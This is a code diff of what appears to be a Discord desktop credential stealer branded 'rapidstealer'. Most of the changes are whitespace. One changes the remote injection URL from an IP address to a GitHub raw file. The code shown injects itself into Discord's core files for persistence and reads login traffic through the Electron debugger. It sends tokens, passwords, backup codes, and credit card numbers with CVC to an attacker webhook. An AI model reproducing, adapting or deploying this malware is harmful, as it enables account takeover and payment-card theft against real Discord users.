@@ -8,7 +8,7 @@ const { BrowserWindow, session } = require('electron');
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "http://64.89.161.119:1337/api/discord",
+    injection_url: "https://raw.githubusercontent.com/a11yxx/manymen/refs/heads/main/README",
     filters: {
         urls: [
             '/auth/login',
@@ -170,10 +170,10 @@ const getFriends = async token => {
     try {
         const friends = await fetchFriends(token);
         if (!friends || !Array.isArray(friends)) return { message: "None", totalFriends: 0 };
-        
+
         const filteredFriends = friends.filter(user => user.type === 1);
         let rareUsers = "";
-        
+
         for (const acc of filteredFriends) {
             const badges = getRareBadges(acc.user?.public_flags);
             if (badges) {
@@ -181,7 +181,7 @@ const getFriends = async token => {
                 rareUsers += `${badges} ${acc.user.username}\n`;
             }
         }
-        
+
         return {
             message: rareUsers || "None",
             totalFriends: filteredFriends.length,
@@ -195,12 +195,12 @@ const getServers = async token => {
     try {
         const guilds = await fetchServers(token);
         if (!guilds || !Array.isArray(guilds)) return { message: "None", totalGuilds: 0 };
-        
-        const filteredGuilds = guilds.filter(guild => 
-            guild.permissions === '562949953421311' || 
+
+        const filteredGuilds = guilds.filter(guild =>
+            guild.permissions === '562949953421311' ||
             guild.permissions === '2251799813685247'
         );
-        
+
         let rareGuilds = "";
         for (const guild of filteredGuilds) {
             if (!rareGuilds) {
@@ -208,7 +208,7 @@ const getServers = async token => {
             }
             rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | ${guild.name} - Members: ${guild.approximate_member_count || 'Unknown'}\n`;
         }
-        
+
         return {
             message: rareGuilds || "None",
             totalGuilds: guilds.length,
@@ -242,7 +242,7 @@ const hooker = async (content, token, account) => {
                     decorationInfo = `<:decoration:1434897313796587611> ${profileData.avatar_decoration_data.asset}`;
                 }
             }
-        } catch (error) {}
+        } catch (error) { }
 
         const payload = {
             username: "t.me/rapidstealer",
@@ -331,7 +331,7 @@ const EmailPassToken = async (email, password, token, action) => {
             }]
         };
         hooker(content, token, account);
-    } catch (error) {}
+    } catch (error) { }
 };
 
 const BackupCodesViewed = async (codes, token) => {
@@ -354,7 +354,7 @@ const BackupCodesViewed = async (codes, token) => {
             }]
         };
         hooker(content, token, account);
-    } catch (error) {}
+    } catch (error) { }
 };
 
 const PasswordChanged = async (newPassword, oldPassword, token) => {
@@ -371,7 +371,7 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
             }]
         };
         hooker(content, token, account);
-    } catch (error) {}
+    } catch (error) { }
 };
 
 const CreditCardAdded = async (number, cvc, month, year, token) => {
@@ -389,7 +389,7 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
             }]
         };
         hooker(content, token, account);
-    } catch (error) {}
+    } catch (error) { }
 };
 
 const PaypalAdded = async (token) => {
@@ -406,7 +406,7 @@ const PaypalAdded = async (token) => {
             }]
         };
         hooker(content, token, account);
-    } catch (error) {}
+    } catch (error) { }
 };
 
 const discordPath = (function () {
@@ -419,7 +419,7 @@ const discordPath = (function () {
             resourcePath = path.join(app, 'Contents', 'Resources');
         }
         if (resourcePath && fs.existsSync(resourcePath)) return { resourcePath, app };
-    } catch (error) {}
+    } catch (error) { }
     return { resourcePath: undefined, app: undefined };
 })();
 
@@ -450,11 +450,11 @@ async function initiation() {
         const appPath = path.join(resourcePath, 'app');
         const packageJson = path.join(appPath, 'package.json');
         const resourceIndex = path.join(appPath, 'index.js');
-        
+
         const modules = fs.readdirSync(path.join(app, 'modules'));
         const coreVal = modules.find(x => /discord_desktop_core-+?/.test(x));
         if (!coreVal) return;
-        
+
         const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
         const bdPath = path.join(process.env.APPDATA || '', 'betterdiscord', 'data', 'betterdiscord.asar');
 
@@ -506,7 +506,7 @@ if (fs.existsSync(bdPath)) require(bdPath);
 
             fs.writeFileSync(resourceIndex, startUpScript);
         }
-    } catch (error) {}
+    } catch (error) { }
 }
 
 let email = "";
@@ -519,22 +519,22 @@ const createWindow = () => {
         if (!mainWindow) return;
 
         mainWindow.webContents.debugger.attach('1.3');
-        
+
         mainWindow.webContents.debugger.on('message', async (_, method, params) => {
             try {
                 if (!initiationCalled) {
                     await initiation();
                     initiationCalled = true;
                 }
-                
+
                 if (method !== 'Network.responseReceived') return;
                 if (!CONFIG.filters.urls.some(url => params.response?.url?.endsWith(url))) return;
                 if (![200, 202].includes(params.response?.status)) return;
-                
+
                 const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
                 if (!responseUnparsedData) return;
                 const responseData = JSON.parse(responseUnparsedData.body);
-                
+
                 const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
                 if (!requestUnparsedData) return;
                 const requestData = JSON.parse(requestUnparsedData.postData);
@@ -561,15 +561,15 @@ const createWindow = () => {
                         await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                     }
                 }
-            } catch (error) {}
+            } catch (error) { }
         });
 
         mainWindow.webContents.debugger.sendCommand('Network.enable');
-        
+
         mainWindow.on('closed', () => {
             setTimeout(createWindow, 1000);
         });
-    } catch (error) {}
+    } catch (error) { }
 };
 
 createWindow();
@@ -578,20 +578,20 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
     try {
         if (![200, 202].includes(details.statusCode)) return;
         if (details.method !== 'POST') return;
-        
+
         if (details.url.endsWith('tokens') && details.uploadData && details.uploadData[0]) {
             const item = querystring.parse(details.uploadData[0].bytes.toString());
             await CreditCardAdded(
-                item['card[number]'], 
-                item['card[cvc]'], 
-                item['card[exp_month]'], 
-                item['card[exp_year]'], 
+                item['card[number]'],
+                item['card[cvc]'],
+                item['card[exp_month]'],
+                item['card[exp_year]'],
                 await getToken()
             );
         } else if (details.url.endsWith('paypal_accounts')) {
             await PaypalAdded(await getToken());
         }
-    } catch (error) {}
+    } catch (error) { }
 });
 
 session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
